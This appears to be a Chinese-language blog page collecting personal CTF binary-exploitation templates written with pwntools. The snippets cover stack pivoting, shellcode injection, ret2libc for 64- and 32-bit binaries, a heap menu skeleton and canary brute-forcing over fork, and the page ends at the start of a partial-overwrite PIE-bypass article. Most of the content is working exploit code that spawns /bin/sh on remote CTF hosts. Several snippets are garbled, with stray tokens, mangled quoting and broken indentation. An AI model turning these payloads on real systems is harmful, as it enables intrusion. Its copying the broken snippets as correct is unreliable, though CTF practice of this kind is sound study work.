href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600717-741d4c4e-f015-4ae6-9643-e528af78ee1d.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600717-741d4c4e-f015-4ae6-9643-e528af78ee1d.py%22,%22name%22:%22Stack_migration.py%22,%22size%22:408,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ufa7ba79b-b21d-4060-8d36-ec9bf4f7e43%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u64b425c3%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">Stack_migration.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600737-69fcf734-fe46-4215-82a2-26da01188c70.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600737-69fcf734-fe46-4215-82a2-26da01188c70.py%22,%22name%22:%22system_call.py%22,%22size%22:1612,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u0a20155d-abfd-4a35-a984-f9de21e9c65%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u1b15c72a%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">system_call.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600739-10f993cd-a36a-4fdf-b487-735b3174bae1.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600739-10f993cd-a36a-4fdf-b487-735b3174bae1.py%22,%22name%22:%22uaf.py%22,%22size%22:541,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u4c559f02-536c-4dcb-b571-715d7cf1a8d%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u7771115c%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">uaf.py</a></p><h2 id="开头"><a href="#开头" class="headerlink" title="开头"></a>开头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>() : <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_shell</span>() : <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><br><span class="hljs-comment">#p = process(&#x27;./easypwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28731</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./easypwn&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="1-栈迁移"><a href="#1-栈迁移" class="headerlink" title="1.栈迁移"></a>1.栈迁移</h1><h3 id="每次执行pop出栈操作栈顶指针-esp-都会向高地址移动-4到8个字节"><a href="#每次执行pop出栈操作栈顶指针-esp-都会向高地址移动-4到8个字节" class="headerlink" title="每次执行pop出栈操作栈顶指针(esp)都会向高地址移动 4到8个字节"></a>每次执行pop出栈操作栈顶指针(esp)都会向高地址移动 4到8个字节</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>p=process(<span class="hljs-string">&#x27;&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><br><span class="hljs-comment">#偏移</span><br>move=<span class="hljs-number">0x0</span><span class="hljs-comment">#垃圾数据的大小</span><br>pianyi=<span class="hljs-number">0x0</span><span class="hljs-comment">#转移地址到原本ebp的偏移量</span><br>addr=<span class="hljs-number">0</span>              <span class="hljs-comment">#存放转移到的地方的内存地址,</span><br><br><span class="hljs-comment">#发送payload获取ebp</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(move-<span class="hljs-number">4</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span><br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><br>sys=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(sys)+p32(<span class="hljs-number">0</span>)+p32(addr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh\0&quot;</span>   <span class="hljs-comment">#0是sys的返回地址</span><br>                                                                    <span class="hljs-comment">#bin/sh在后面是因为pxx()不支持直接发字符</span><br>payload2=payload2.ljust(move,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(proc.pidof(a)[0])</span><br>payload2+=p32(ebp-pianyi)+p32(leave_ret)<br><br><span class="hljs-comment">#发送</span><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="2-shellcode"><a href="#2-shellcode" class="headerlink" title="2.shellcode"></a>2.shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>p=process(<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">context.arch=&#x27;</span>amd64<span class="hljs-string">&#x27;</span><br><span class="hljs-string">shellcode=asm(shellcraft.sh())</span><br><span class="hljs-string"></span><br><span class="hljs-string">#偏移</span><br><span class="hljs-string">move=0x0</span><br><span class="hljs-string"></span><br><span class="hljs-string">#地址</span><br><span class="hljs-string">bass_addr=0x0</span><br><span class="hljs-string">payload1=shellcode</span><br><span class="hljs-string">payload2=b&#x27;</span>a<span class="hljs-string">&#x27;*(move+8)+p64(name_addr)</span><br><span class="hljs-string"></span><br><span class="hljs-string">#接收</span><br><span class="hljs-string">p.recvuntil(&#x27;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">#发送shellcode</span><br><span class="hljs-string">p.sendline(payload1)</span><br><span class="hljs-string"></span><br><span class="hljs-string">#接收</span><br><span class="hljs-string">p.recvuntil(&#x27;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">#发送payload2启动shellcode</span><br><span class="hljs-string">p.sendline(payload2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">p.interactive()</span><br></code></pre></td></tr></table></figure><h1 id="3-堆-大坑"><a href="#3-堆-大坑" class="headerlink" title="3.堆(大坑)"></a>3.堆(大坑)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf_name=<span class="hljs-string">&#x27;&#x27;</span><br>link=&#123;<br>    <span class="hljs-string">&#x27;ip&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span>:<br>&#125;<br>libc_path_local=<span class="hljs-string">&#x27;&#x27;</span><br>libc_path_con=<span class="hljs-string">&#x27;&#x27;</span><br>one_local=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>one_con=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br><br>elf = ELF(<span class="hljs-string">&#x27;&#x27;</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">local=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">global</span> p,libc_elf,onegadget<br>    <span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>        p = process(elf_name)<br>        libc_elf = ELF(libc_path_local)<br>        onegadget=one_local<br>    <span class="hljs-keyword">else</span>:<br>        p = remote(link[<span class="hljs-string">&#x27;ip&#x27;</span>],link[<span class="hljs-string">&#x27;port&#x27;</span>])<br>        libc_elf = ELF(libc_path_con)<br>        onegadget=one_con<br>        <br>        context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>        <br>        menu = <span class="hljs-string">b&quot;choice &gt; &quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>            gdb.attach(proc.pidof(p)[<span class="hljs-number">0</span>])<br>            <br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, msg</span>):<br>                p.sendlineafter(menu, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>                p.sendlineafter(<span class="hljs-string">b&quot;&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>                p.sendafter(<span class="hljs-string">b&quot;&quot;</span>, msg)<br>                <br>              <br>                <span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">size</span>):<br>                    p.sendlineafter(menu, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>                    p.sendlineafter(<span class="hljs-string">b&#x27;&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>                    <br>     <span class="hljs-number">0</span>               <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">size</span>):<br>                        p.sendlineafter(menu, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>                        p.sendlineafter(<span class="hljs-string">b&#x27;&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>                        <br>                        <span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>                            <span class="hljs-comment">#start</span><br>                            <br>                            connect(<span class="hljs-number">1</span>)<br>pwn()<br></code></pre></td></tr></table></figure><h1 id="4-libc-64"><a href="#4-libc-64" class="headerlink" title="4.libc(64)"></a>4.libc(64)</h1><blockquote><p>64位的程序地址基本是7f开头的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>p=process(<span class="hljs-string">&#x27;&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#偏移</span><br>move=<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))      <span class="hljs-comment">#接收泄露函数地址的函数</span><br><br><span class="hljs-comment">#地址</span><br>pop_rdi=<br>ret=<br>function_got=elf.got[<span class="hljs-string">&#x27;&#x27;</span>]<br>function_plt=elf.plt[<span class="hljs-string">&#x27;&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-comment">#payload1</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(move+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(function_got)+p64(function_plt)+p64(main)<br><br><span class="hljs-comment">#接收</span><br><span class="hljs-comment">#p.recvuntil(&#x27;&#x27;)</span><br><br><span class="hljs-comment">#发送payload</span><br>p.sendline(payload1)<br><br><span class="hljs-comment">#接收地址</span><br>target_addr=get_addr()<br><br><span class="hljs-comment">#print(hex(target_addr))</span><br><br><span class="hljs-comment">#LibcSearcher匹配地址找system和binsh</span><br>libc=LibcSearcher(<span class="hljs-string">&#x27;function&#x27;</span>,target_addr)<br>addr=target_addr-libc.dump(<span class="hljs-string">&#x27;function&#x27;</span>)<br>binsh=addr+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>sys=addr+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br><span class="hljs-comment">#payload2</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(move+<span class="hljs-number">8</span>)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)<br><br><span class="hljs-comment">#接收</span><br><span class="hljs-comment">#p.recvuntil(&#x27;&#x27;)</span><br><br><span class="hljs-comment">#发送payload</span><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="5-libc-32"><a href="#5-libc-32" class="headerlink" title="5.libc(32)"></a>5.libc(32)</h1><blockquote><p>32位的程序地址基本是f7开头的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>) <span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25508)</span><br>e = ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>) <br>offset = <span class="hljs-number">0x6c</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>p.sendline(payload1)<br>p.recvuntil(payload1)zh<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>addr = p.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(addr)<br>log.success(<span class="hljs-string">&quot;addr:&quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*offset + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(sh_addr)<br><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-5本地libc用sym找函数偏移-用sym"><a href="#5-5本地libc用sym找函数偏移-用sym" class="headerlink" title="5.5本地libc用sym找函数偏移,用sym[]"></a>5.5本地libc用sym找函数偏移,用sym[]</h2><p>本地搜字符串用next(libc.search(b’&#x2F;bin&#x2F;sh\x00’))</p><h2 id="5-6静态ROP链生成"><a href="#5-6静态ROP链生成" class="headerlink" title="5.6静态ROP链生成"></a>5.6静态ROP链生成</h2><blockquote><ol><li>ROPgadget–binary 文件名 –ropchain</li></ol></blockquote><h2 id="远程libcsearch用dump"><a href="#远程libcsearch用dump" class="headerlink" title="远程libcsearch用dump()"></a>远程libcsearch用dump()</h2><h1 id="6-通用"><a href="#6-通用" class="headerlink" title="6.通用"></a>6.通用</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))  接收后<span class="hljs-number">6</span>位然后<span class="hljs-string">&#x27;\x00&#x27;</span>补到<span class="hljs-number">8</span>位<br>    read_addr = u32(p.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attach_</span>():<br>    gdb.attach(p)     <span class="hljs-comment">#脚本调试函数</span><br>    pause()<br>    <br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]  tmux分屏调试<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_canary</span>():<br>     canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>     <span class="hljs-keyword">return</span> canary                  接收canary泄露canary是0xasdfghjkl形式的<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_PIE_base</span>():<br>     base=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x9dc</span><br> <span class="hljs-keyword">return</span> base                   意思是从<span class="hljs-number">16</span>个(后面的参数)选出<span class="hljs-number">14</span>个(前面的参数)<br></code></pre></td></tr></table></figure><h1 id="fork爆破canary模板"><a href="#fork爆破canary模板" class="headerlink" title="fork爆破canary模板"></a>fork爆破canary模板</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>#先给canary的最后一位<br><span class="hljs-keyword">for</span> k in range(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):<br>        print (<span class="hljs-string">&quot;正在爆破Canary的第&quot;</span> + str(k+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;位&quot;</span>) <br>        print (<span class="hljs-string">&quot;当前的字符为&quot;</span>+ chr(i))<br>        payload=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">100</span> + canary + bytes([i])<br>        print (<span class="hljs-string">&quot;当前payload为：&quot;</span>,payload)<br>        p.send(b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">100</span> + canary + bytes([i]))<span class="hljs-meta">#i集合</span><br>        data=p.recvuntil(<span class="hljs-string">&quot;welcome\n&quot;</span>)<br>        print (data)<br>        <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;sucess&quot;</span> in data:#爆破成功的标志(程序没有崩溃时的表现作为标志)<br>            canary +=  bytes([i])<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="在语句中用正则表达式取16进制数模板"><a href="#在语句中用正则表达式取16进制数模板" class="headerlink" title="在语句中用正则表达式取16进制数模板"></a>在语句中用正则表达式取16进制数模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">line = p.recvline().decode().strip()<br><span class="hljs-comment">#.decode()：将接收到的字节串转换为Python字符串。</span><br><span class="hljs-comment">#.strip()：去除字符串开头和结尾的空格和换行符。</span><br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;0x[0-9a-fA-F]+&#x27;</span>, line)<br>value = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">0</span>)<span class="hljs-comment">#返回第一个匹配到的字符串</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/"/>
    <url>/2024/09/16/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="花式栈溢出技巧-栈上的-partial-overwrite（绕过PIE保护）"><a href="#花式栈溢出技巧-栈上的-partial-overwrite（绕过PIE保护）" class="headerlink" title="花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）"></a><strong>花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）</strong></h2><p>PIE特征</p><p>我们知道，在程序开启了pie保护时（PIE enabled）高位的地址会发生随机化，但低位的偏移是始终固定的，也就是说我们如果能够更改低位的偏移，就可以在一定程度上控制程序的执行流，绕过pie保护</p><p>（partial overwtite 不仅仅可以用在栈上，同样也可以用在其他随机化的场景，比如堆的随机化，由于堆起始地址的低字节一定是0x00，也可以通过覆盖低位来控制堆上的偏移。）</p><p>例子：nss上的eaststack</p><p>vuln函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-100h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I am back! Can you beat me this time?\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10A</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, 